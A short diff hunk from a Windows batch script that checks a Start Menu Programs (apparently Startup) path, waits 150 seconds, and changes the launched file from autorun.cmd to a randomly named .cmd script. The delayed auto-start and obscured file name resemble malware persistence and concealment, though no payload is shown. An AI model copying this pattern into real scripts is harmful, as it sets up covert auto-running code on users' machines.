@@ -20,7 +20,7 @@ if not exist %userprofile%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Progra
     
 )
 timeout 150
-start autorun.cmd
+start 31513wd5w1d3a5wd185s3d51a.cmd
 
 
 
